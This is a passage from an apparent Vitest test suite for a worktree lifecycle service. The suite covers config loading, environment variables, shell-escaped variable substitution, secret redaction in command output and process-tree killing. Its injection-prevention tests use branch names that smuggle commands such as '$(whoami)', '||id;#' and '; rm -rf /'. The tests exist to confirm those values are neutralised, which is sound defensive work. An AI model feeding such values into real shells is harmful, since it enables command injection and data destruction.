import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import path from "path";

/** Normalize a path to forward slashes for cross-platform mock matching */
const n = (p: string) => (p as string).replace(/\\/g, "/");

vi.mock("fs/promises", () => ({
  readFile: vi.fn(),
  access: vi.fn(),
  cp: vi.fn().mockResolvedValue(undefined),
  mkdir: vi.fn().mockResolvedValue(undefined),
  readdir: vi.fn().mockResolvedValue([]),
  unlink: vi.fn().mockResolvedValue(undefined),
}));

vi.mock("child_process", () => ({
  spawn: vi.fn(),
}));

vi.mock("../../utils/windowsTreeKill.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../utils/windowsTreeKill.js")>()),
  killWindowsProcessTreeInBackground: vi.fn(() => Promise.resolve(null)),
}));

vi.mock("../../utils/fs.js", () => ({
  resilientAtomicWriteFile: vi.fn().mockResolvedValue(undefined),
}));

/**
 * Every repository command is allowed, so the suites below exercise what runs
 * once the user has approved it. The gate itself is covered by the "repository
 * command approval" suite, which swaps in a real approval set.
 */
const approveEverything: import("../lifecycleCommandTrust.js").LifecycleCommandApprovalStore = {
  isApproved: async () => true,
  approve: async () => {},
};

describe("WorktreeLifecycleService", () => {
  let service: import("../WorktreeLifecycleService.js").WorktreeLifecycleService;
  let mockAccess: ReturnType<typeof vi.fn>;
  let mockReadFile: ReturnType<typeof vi.fn>;
  let mockCp: ReturnType<typeof vi.fn>;
  let mockSpawn: ReturnType<typeof vi.fn>;
  let mockTreeKill: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();

    const fsModule = await import("fs/promises");
    mockAccess = vi.mocked(fsModule.access);
    mockReadFile = vi.mocked(fsModule.readFile);
    mockCp = vi.mocked(fsModule.cp);

    const childProcessModule = await import("child_process");
    mockSpawn = vi.mocked(childProcessModule.spawn);
    mockTreeKill = vi.mocked(
      (await import("../../utils/windowsTreeKill.js")).killWindowsProcessTreeInBackground
    );

    const { WorktreeLifecycleService } = await import("../WorktreeLifecycleService.js");
    service = new WorktreeLifecycleService("/home/testuser", approveEverything);
  });

  describe("loadConfig", () => {
    it("returns null when no config files exist", async () => {
      mockAccess.mockRejectedValue(new Error("ENOENT"));
      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toBeNull();
    });

    it("returns main repo config when only it exists", async () => {
      const projectConfig = { setup: ["npm install"], teardown: ["docker compose down"] };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined; // main repo config exists
      });

      mockReadFile.mockResolvedValue(JSON.stringify(projectConfig));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(projectConfig);
    });

    it("uses worktree-level config over main repo config (priority chain)", async () => {
      const mainConfig = { setup: ["npm install"] };
      const worktreeConfig = { setup: ["yarn install"] };

      mockAccess.mockImplementation(async (p: string) => {
        // user config does not exist
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        // worktree config exists (second check)
        return undefined;
      });

      mockReadFile.mockImplementation(async (p: string) => {
        if (n(p).endsWith("/worktree/.daintree/config.json")) {
          return JSON.stringify(worktreeConfig);
        }
        return JSON.stringify(mainConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.setup).toEqual(["yarn install"]);
    });

    it("skips invalid JSON and tries next config", async () => {
      const validConfig = { setup: ["npm install"] };

      let readCount = 0;
      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockImplementation(async () => {
        readCount++;
        if (readCount === 1) return "not valid json{{{";
        return JSON.stringify(validConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(validConfig);
    });

    it("skips config with invalid schema and tries next", async () => {
      const invalidConfig = { setup: [123, true] }; // not strings
      const validConfig = { setup: ["npm install"] };

      let readCount = 0;
      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockImplementation(async () => {
        readCount++;
        if (readCount === 1) return JSON.stringify(invalidConfig);
        return JSON.stringify(validConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(validConfig);
    });

    it("reads a config saved with a UTF-8 BOM instead of skipping it", async () => {
      const projectConfig = { setup: ["npm install"] };

      mockAccess.mockImplementation(async (p: string) => {
        if (!n(p).endsWith("/project/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });
      // What Windows PowerShell 5.1's `Set-Content -Encoding utf8` writes.
      mockReadFile.mockResolvedValue("﻿" + JSON.stringify(projectConfig));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(projectConfig);
    });

    it("returns config with only setup or only teardown", async () => {
      const config = { teardown: ["docker compose down"] };

      mockAccess.mockImplementation(async (p: string) => {
        if (!n(p).endsWith("/project/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.setup).toBeUndefined();
      expect(result?.teardown).toEqual(["docker compose down"]);
    });
  });

  describe("loadConfig with resource block", () => {
    it("parses a full resource config with all fields", async () => {
      const config = {
        setup: ["npm install"],
        resource: {
          provision: ["docker compose up -d"],
          teardown: ["docker compose down"],
          resume: ["docker compose start"],
          pause: ["docker compose stop"],
          status: "docker compose ps --format json",
          connect: "docker exec -it app bash",
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.setup).toEqual(["npm install"]);
      expect(result?.resource).toBeDefined();
      expect(result?.resource?.provision).toEqual(["docker compose up -d"]);
      expect(result?.resource?.teardown).toEqual(["docker compose down"]);
      expect(result?.resource?.resume).toEqual(["docker compose start"]);
      expect(result?.resource?.pause).toEqual(["docker compose stop"]);
      expect(result?.resource?.status).toBe("docker compose ps --format json");
      expect(result?.resource?.connect).toBe("docker exec -it app bash");
    });

    it("parses an empty resource block as valid", async () => {
      const config = { resource: {} };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.resource).toEqual({});
    });

    it("rejects config where resource.status is an array instead of string", async () => {
      const invalidConfig = { resource: { status: ["invalid"] } };
      const validConfig = { setup: ["npm install"] };

      let readCount = 0;
      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockImplementation(async () => {
        readCount++;
        if (readCount === 1) return JSON.stringify(invalidConfig);
        return JSON.stringify(validConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(validConfig);
    });
  });

  describe("loadConfig with resources (plural) block", () => {
    it("parses resources record with multiple named environments", async () => {
      const config = {
        resources: {
          docker: {
            provision: ["docker compose up -d"],
            connect: "docker exec -it app bash",
          },
          akash: {
            provision: ["akash deploy"],
            status: "akash status",
          },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.resources?.docker?.provision).toEqual(["docker compose up -d"]);
      expect(result?.resources?.akash?.status).toBe("akash status");
    });
  });

  describe("loadResourceConfig resolution", () => {
    it("returns named environment when environmentId provided", async () => {
      const config = {
        resources: {
          docker: { provision: ["docker up"] },
          akash: { provision: ["akash deploy"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig(
        "/path/to/worktree",
        "/path/to/project",
        "akash"
      );
      expect(result?.provision).toEqual(["akash deploy"]);
    });

    it("returns default environment when no environmentId", async () => {
      const config = {
        resources: {
          default: { provision: ["default-provision"] },
          staging: { provision: ["staging-provision"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result?.provision).toEqual(["default-provision"]);
    });

    it("falls back to singular resource when resources not present", async () => {
      const config = {
        resource: { provision: ["old-way"] },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result?.provision).toEqual(["old-way"]);
    });

    it("returns null when neither resource nor resources exist", async () => {
      const config = { setup: ["npm install"] };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result).toBeNull();
    });

    it("falls back to first entry when no default and no environmentId", async () => {
      const config = {
        resources: {
          staging: { provision: ["staging-deploy"] },
          prod: { provision: ["prod-deploy"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.daintree/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.daintree/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result?.provision).toEqual(["staging-deploy"]);
    });
  });

  describe("copyDaintreeDir", () => {
    it("does nothing if source .daintree does not exist", async () => {
      mockAccess.mockRejectedValue(new Error("ENOENT"));
      await service.copyDaintreeDir("/main/repo", "/new/worktree");
      expect(mockCp).not.toHaveBeenCalled();
    });

    it("copies .daintree from src to dest even if dest already exists (force:false preserves existing)", async () => {
      mockAccess.mockResolvedValue(undefined); // src exists
      await service.copyDaintreeDir("/main/repo", "/new/worktree");
      expect(mockCp).toHaveBeenCalledWith(
        path.join("/main/repo", ".daintree"),
        path.join("/new/worktree", ".daintree"),
        {
          recursive: true,
          force: false,
          errorOnExist: false,
        }
      );
    });

    it("propagates the error if cp fails so the caller can surface it", async () => {
      // Per #8401, copyDaintreeDir no longer swallows its error — the caller
      // (WorkspaceService createWorktree async tail) has `worktreeId` in scope
      // and routes the failure through `notify-error` so the worktree card can
      // show it instead of disappearing into `console.warn`.
      mockAccess.mockImplementation(async (p: string) => {
        if ((p as string).includes(path.join("/main/repo", ".daintree"))) return undefined;
        throw new Error("ENOENT");
      });
      mockCp.mockRejectedValue(new Error("Permission denied"));

      await expect(service.copyDaintreeDir("/main/repo", "/new/worktree")).rejects.toThrow(
        "Permission denied"
      );
    });
  });

  describe("buildEnv", () => {
    it("returns DAINTREE_* and non-interactive environment variables", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/my-branch");
      expect(env).toEqual({
        CI: "true",
        NONINTERACTIVE: "1",
        GIT_TERMINAL_PROMPT: "0",
        DEBIAN_FRONTEND: "noninteractive",
        DAINTREE_WORKTREE_PATH: "/worktrees/feat",
        DAINTREE_PROJECT_ROOT: "/project",
        DAINTREE_WORKTREE_NAME: "feature/my-branch",
      });
    });

    it("includes DAINTREE_BRANCH when branch is provided", () => {
      const env = service.buildEnv(
        "/worktrees/feat",
        "/project",
        "feature/lifecycle",
        "feature/lifecycle"
      );
      expect(env.DAINTREE_BRANCH).toBe("feature/lifecycle");
    });

    it("includes DAINTREE_RESOURCE_PROVIDER when resource provider is provided", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        provider: "akash",
      });
      expect(env.DAINTREE_RESOURCE_PROVIDER).toBe("akash");
    });

    it("includes DAINTREE_RESOURCE_ENDPOINT when resource endpoint is provided", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        endpoint: "https://app.example.com",
      });
      expect(env.DAINTREE_RESOURCE_ENDPOINT).toBe("https://app.example.com");
    });

    it("includes DAINTREE_RESOURCE_STATUS when resource lastOutput is provided", () => {
      const jsonOutput = '{"status":"ready","endpoint":"10.0.0.1"}';
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        lastOutput: jsonOutput,
      });
      expect(env.DAINTREE_RESOURCE_STATUS).toBe(jsonOutput);
    });

    it("omits individual resource vars when their values are undefined", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        provider: "fly",
      });
      expect(env.DAINTREE_RESOURCE_PROVIDER).toBe("fly");
      expect(env).not.toHaveProperty("DAINTREE_RESOURCE_ENDPOINT");
      expect(env).not.toHaveProperty("DAINTREE_RESOURCE_STATUS");
    });
  });

  describe("substituteVariables", () => {
    const origPlatform = process.platform;
    afterEach(() => {
      Object.defineProperty(process, "platform", { value: origPlatform });
    });

    function setPlatform(p: string) {
      Object.defineProperty(process, "platform", { value: p });
    }

    const baseVars = { worktree_path: "/w", worktree_name: "test", project_root: "/p" };

    it("shell-escapes {{branch}} on Unix (single quotes)", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
        ...baseVars,
        branch: "feature/test",
      });
      expect(result).toBe("ssh deploy@'feature/test'.example.com");
    });

    it("shell-escapes {{branch}} on Windows (double quotes)", () => {
      setPlatform("win32");
      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
        ...baseVars,
        branch: "feature/test",
      });
      expect(result).toBe('ssh deploy@"feature/test".example.com');
    });

    it("leaves unresolved variables as-is (fails loudly in shell)", () => {
      const result = service.substituteVariables("ssh root@{{unknown_var}}", baseVars);
      expect(result).toBe("ssh root@{{unknown_var}}");
    });

    it("replaces multiple variables with escaping", () => {
      setPlatform("linux");
      const result = service.substituteVariables(
        "deploy --branch={{branch}} --dir={{worktree_path}} --name={{worktree_name}}",
        { ...baseVars, branch: "main", worktree_path: "/w/main", worktree_name: "main" }
      );
      expect(result).toBe("deploy --branch='main' --dir='/w/main' --name='main'");
    });

    it("is case-insensitive for variable names", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("echo {{BRANCH}} {{Worktree_Path}}", {
        ...baseVars,
        branch: "dev",
      });
      expect(result).toBe("echo 'dev' '/w'");
    });

    it("leaves {branch-slug} unquoted (already sanitized to [a-z0-9-])", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("deploy {branch-slug}", {
        ...baseVars,
        branch: "feature/test",
        "branch-slug": "feature-test",
      });
      expect(result).toBe("deploy feature-test");
    });

    describe("shell injection prevention", () => {
      it("neutralizes $(command) in branch names on Unix", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: "feat/$(whoami)",
        });
        expect(result).toBe("echo 'feat/$(whoami)'");
      });

      it("escapes embedded single quotes on Unix", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: "it's-a-branch",
        });
        expect(result).toBe("echo 'it'\\''s-a-branch'");
      });

      it("escapes embedded double quotes on Windows", () => {
        setPlatform("win32");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: 'say "hi"',
        });
        expect(result).toBe('echo "say ""hi"""');
      });

      it("escapes Windows %VAR% environment variable expansion", () => {
        setPlatform("win32");
        const result = service.substituteVariables("deploy {{branch}}", {
          ...baseVars,
          branch: "feat/%CD%",
        });
        expect(result).toBe('deploy "feat/%%CD%%"');
      });

      it("never re-expands placeholders inside a value it already substituted", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: "x{branch}$(id)",
        });
        expect(result).toBe("echo 'x{branch}$(id)'");
      });

      it("leaves placeholders straight after `$` alone", () => {
        setPlatform("linux");
        // Substituted, `${{endpoint}}` would become `$'…'`, where bash reads
        // backslash escapes and a crafted value could close the quote.
        const result = service.substituteVariables("ssh ${{endpoint}} ${branch-slug}", {
          ...baseVars,
          endpoint: "box\\'||id;#",
          "branch-slug": "feature-x",
        });
        expect(result).toBe("ssh ${{endpoint}} ${branch-slug}");
      });

      it("still expands both placeholder forms in one template", () => {
        setPlatform("linux");
        const result = service.substituteVariables("cd {{worktree_path}} && deploy {branch-slug}", {
          ...baseVars,
          "branch-slug": "feature-x",
        });
        expect(result).toBe("cd '/w' && deploy feature-x");
      });

      it("falls back to escaping branch-slug if it contains unexpected characters", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("deploy {branch-slug}", {
          ...baseVars,
          "branch-slug": "bad; rm -rf /",
        });
        expect(result).toBe("deploy 'bad; rm -rf /'");
      });
    });
  });

  describe("buildVariables", () => {
    it("returns all lifecycle variables", () => {
      const vars = service.buildVariables("/w/feat", "/project", "feat-branch", "feature/test");
      expect(vars).toEqual({
        branch: "feature/test",
        worktree_path: "/w/feat",
        worktree_name: "feat-branch",
        project_root: "/project",
        endpoint: undefined,
        "parent-dir": "/",
        "base-folder": "project",
        "branch-slug": "feature-test",
        "repo-name": "project",
      });
    });

    it("sets branch to undefined when not provided", () => {
      const vars = service.buildVariables("/w/detached", "/project", "detached");
      expect(vars.branch).toBeUndefined();
    });

    it("includes endpoint when provided", () => {
      const vars = service.buildVariables("/w", "/p", "test", "main", "https://app.example.com");
      expect(vars).toEqual({
        branch: "main",
        worktree_path: "/w",
        worktree_name: "test",
        project_root: "/p",
        endpoint: "https://app.example.com",
        "parent-dir": "/",
        "base-folder": "p",
        "branch-slug": "main",
        "repo-name": "p",
      });
    });
  });

  describe("runCommands", () => {
    function makeFakeProcess(exitCode: number = 0, errorEvent?: Error) {
      const stdout = { on: vi.fn() };
      const stderr = { on: vi.fn() };
      const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};

      const child = {
        pid: 12345,
        stdout,
        stderr,
        on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
          listeners[event] ??= [];
          listeners[event].push(cb);
        }),
        kill: vi.fn(),
        emit: (event: string, ...args: unknown[]) => {
          listeners[event]?.forEach((cb) => cb(...args));
        },
      };

      // Simulate async process completion
      setTimeout(() => {
        if (errorEvent) {
          child.emit("error", errorEvent);
        } else {
          child.emit("close", exitCode);
        }
      }, 0);

      return child;
    }

    function makeFakeProcessWithOutput(
      stdoutData: string | string[],
      exitCode: number = 0,
      stderrData?: string
    ) {
      const stdoutListeners: ((chunk: Buffer) => void)[] = [];
      const stderrListeners: ((chunk: Buffer) => void)[] = [];
      const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};

      const stdout = {
        on: vi.fn((event: string, cb: (chunk: Buffer) => void) => {
          if (event === "data") stdoutListeners.push(cb);
        }),
      };
      const stderr = {
        on: vi.fn((event: string, cb: (chunk: Buffer) => void) => {
          if (event === "data") stderrListeners.push(cb);
        }),
      };

      const child = {
        pid: 12345,
        stdout,
        stderr,
        on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
          listeners[event] ??= [];
          listeners[event].push(cb);
        }),
        kill: vi.fn(),
        emit: (event: string, ...args: unknown[]) => {
          listeners[event]?.forEach((cb) => cb(...args));
        },
      };

      const stdoutChunks = Array.isArray(stdoutData) ? stdoutData : [stdoutData];

      setTimeout(() => {
        for (const chunk of stdoutChunks) {
          stdoutListeners.forEach((cb) => cb(Buffer.from(chunk)));
        }
        if (stderrData !== undefined) {
          stderrListeners.forEach((cb) => cb(Buffer.from(stderrData)));
        }
        child.emit("close", exitCode);
      }, 0);

      return child;
    }

    it("returns success when command exits with code 0", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(0));

      const onProgress = vi.fn();
      const result = await service.runCommands(["echo hello"], {
        cwd: "/test",
        env: {},
        onProgress,
      });

      expect(result.success).toBe(true);
      expect(onProgress).toHaveBeenCalledWith(0, 1, "echo hello");
    });

    it("returns failure when command exits with non-zero code", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(1));

      const result = await service.runCommands(["npm install"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain("exit");
    });

    it("returns success for empty commands array", async () => {
      const result = await service.runCommands([], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(true);
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it("returns failure on spawn error event", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(0, new Error("ENOENT: not found")));

      const result = await service.runCommands(["nonexistent-cmd"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain("ENOENT");
    });

    it("runs multiple provision commands sequentially", async () => {
      const callOrder: string[] = [];
      mockSpawn.mockImplementation((cmd: string) => {
        callOrder.push(cmd);
        return makeFakeProcess(0);
      });

      const result = await service.runCommands(
        ["docker compose pull", "docker compose up -d", "docker compose exec app migrate"],
        {
          cwd: "/project",
          env: {},
          onProgress: vi.fn(),
        }
      );

      expect(result.success).toBe(true);
      expect(callOrder).toEqual([
        "docker compose pull",
        "docker compose up -d",
        "docker compose exec app migrate",
      ]);
    });

    it("stops at first failing provision command", async () => {
      let callCount = 0;
      mockSpawn.mockImplementation(() => {
        callCount++;
        return makeFakeProcess(callCount === 2 ? 1 : 0);
      });

      const result = await service.runCommands(
        ["docker compose pull", "docker compose up -d", "docker compose exec app migrate"],
        {
          cwd: "/project",
          env: {},
          onProgress: vi.fn(),
        }
      );

      expect(result.success).toBe(false);
      expect(callCount).toBe(2);
      expect(result.error).toContain("docker compose up -d");
    });

    it("reports progress correctly for resource command sequences", async () => {
      mockSpawn.mockImplementation(() => makeFakeProcess(0));

      const onProgress = vi.fn();
      await service.runCommands(["docker compose pull", "docker compose up -d"], {
        cwd: "/project",
        env: {},
        onProgress,
      });

      expect(onProgress).toHaveBeenCalledTimes(2);
      expect(onProgress).toHaveBeenCalledWith(0, 2, "docker compose pull");
      expect(onProgress).toHaveBeenCalledWith(1, 2, "docker compose up -d");
    });

    it.skipIf(process.platform === "win32")("injects PATH and HOME on Unix", async () => {
      const child = makeFakeProcess(0);
      mockSpawn.mockReturnValue(child);

      await service.runCommands(["echo test"], {
        cwd: "/test",
        env: { DAINTREE_WORKTREE_PATH: "/wt" },
        onProgress: vi.fn(),
      });

      expect(mockSpawn).toHaveBeenCalledWith(
        "echo test",
        expect.objectContaining({
          env: expect.objectContaining({
            DAINTREE_WORKTREE_PATH: "/wt",
            PATH: expect.any(String),
            HOME: expect.any(String),
          }),
        })
      );
    });

    it("scrubs secrets from captured stdout before returning", async () => {
      const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";
      const stdoutText = `Setup complete. token=${token} remaining work to do.`;
      mockSpawn.mockReturnValue(makeFakeProcessWithOutput(stdoutText, 0));

      const result = await service.runCommands(["./setup.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(true);
      expect(result.output).not.toContain(token);
      expect(result.output).toContain("[REDACTED]");
      expect(result.output).toContain("Setup complete.");
      expect(result.output).toContain("remaining work to do.");
    });

    it("scrubs secrets emitted to stderr on command failure", async () => {
      const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";
      const stderrText = `error: authentication failed using ${token}`;
      mockSpawn.mockReturnValue(makeFakeProcessWithOutput("", 1, stderrText));

      const result = await service.runCommands(["./setup.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(false);
      expect(result.output).not.toContain(token);
      expect(result.output).toContain("[REDACTED]");
      expect(result.output).toContain("authentication failed");
    });

    it("scrubs secrets when split across multiple stdout chunks (post-join scrubbing)", async () => {
      const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";
      const halfA = `before token=ghp_abcdefghijklmnop`;
      const halfB = `qrstuvwxyz0123456789ABCD after`;
      mockSpawn.mockReturnValue(makeFakeProcessWithOutput([halfA, halfB], 0));

      const result = await service.runCommands(["./setup.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(true);
      expect(result.output).not.toContain(token);
      expect(result.output).toContain("[REDACTED]");
      expect(result.output).toContain("before");
      expect(result.output).toContain("after");
    });

    it("preserves valid JSON structure when scrubbing a secret inside a string value", async () => {
      const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";
      const json = JSON.stringify({ status: "ok", endpoint: "https://api.example.com", token });
      mockSpawn.mockReturnValue(makeFakeProcessWithOutput(json, 0));

      const result = await service.runCommands(["./status.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(true);
      expect(result.output).not.toContain(token);
      const parsed = JSON.parse(result.output) as Record<string, string>;
      expect(parsed.status).toBe("ok");
      expect(parsed.endpoint).toBe("https://api.example.com");
      expect(parsed.token).toBe("[REDACTED]");
    });

    it("uses detached conditionally based on platform", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(0));

      await service.runCommands(["echo test"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      const expectedDetached = process.platform !== "win32";
      expect(mockSpawn).toHaveBeenCalledWith(
        "echo test",
        expect.objectContaining({ detached: expectedDetached, shell: true, windowsHide: true })
      );
    });

    describe("platform-specific process killing", () => {
      const originalPlatform = process.platform;
      let processKillSpy: ReturnType<typeof vi.spyOn> | undefined;

      afterEach(() => {
        processKillSpy?.mockRestore();
        processKillSpy = undefined;
        Object.defineProperty(process, "platform", { value: originalPlatform });
        vi.useRealTimers();
      });

      it("uses the verified tree kill on Windows for timeout kill", async () => {
        Object.defineProperty(process, "platform", { value: "win32" });
        vi.useFakeTimers();

        const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
        const child = {
          pid: 12345,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
            listeners[event] ??= [];
            listeners[event].push(cb);
          }),
          kill: vi.fn(),
        };
        mockSpawn.mockReturnValue(child);

        const resultPromise = service.runCommands(["slow-cmd"], {
          cwd: "/test",
          env: {},
          timeoutMs: 1000,
          onProgress: vi.fn(),
        });

        // Advance past the timeout
        vi.advanceTimersByTime(1001);

        expect(mockTreeKill).toHaveBeenCalledWith(
          expect.objectContaining({ pid: 12345 }),
          "[WorktreeLifecycle]"
        );

        // Emit close to resolve the promise
        listeners["close"]?.forEach((cb) => cb(1));
        const result = await resultPromise;
        expect(result.timedOut).toBe(true);
      });

      it("uses process group kill on Unix for timeout kill", async () => {
        Object.defineProperty(process, "platform", { value: "darwin" });
        vi.useFakeTimers();

        processKillSpy = vi.spyOn(process, "kill").mockImplementation(() => true);

        const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
        const child = {
          pid: 12345,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
            listeners[event] ??= [];
            listeners[event].push(cb);
          }),
          kill: vi.fn(),
        };
        mockSpawn.mockReturnValue(child);

        const resultPromise = service.runCommands(["slow-cmd"], {
          cwd: "/test",
          env: {},
          timeoutMs: 1000,
          onProgress: vi.fn(),
        });

        // Advance past the timeout
        vi.advanceTimersByTime(1001);

        expect(processKillSpy).toHaveBeenCalledWith(-12345, "SIGTERM");
        expect(mockTreeKill).not.toHaveBeenCalled();

        // Advance 5s for SIGKILL escalation
        vi.advanceTimersByTime(5000);
        expect(processKillSpy).toHaveBeenCalledWith(-12345, "SIGKILL");

        // Emit close to resolve the promise
        listeners["close"]?.forEach((cb) => cb(null));
        await resultPromise;
      });

      it("injects USERPROFILE and PATHEXT on Windows", async () => {
        Object.defineProperty(process, "platform", { value: "win32" });

        const child = makeFakeProcess(0);
        mockSpawn.mockReturnValue(child);

        await service.runCommands(["echo test"], {
          cwd: "/test",
          env: { DAINTREE_WORKTREE_PATH: "/wt" },
          onProgress: vi.fn(),
        });

        const spawnEnv = mockSpawn.mock.calls[0][1].env;
        // Windows env-var names are case-insensitive; on a Windows host the
        // copied keys can be any case (e.g. `SYSTEMROOT` or `Systemroot`),
        // so check the upper-cased key set rather than literal property names.
        const upperKeys = new Set(Object.keys(spawnEnv).map((k) => k.toUpperCase()));
        expect(upperKeys.has("USERPROFILE")).toBe(true);
        expect(upperKeys.has("PATHEXT")).toBe(true);
        expect(upperKeys.has("SYSTEMROOT")).toBe(true);
        expect(upperKeys.has("HOME")).toBe(false);
      });

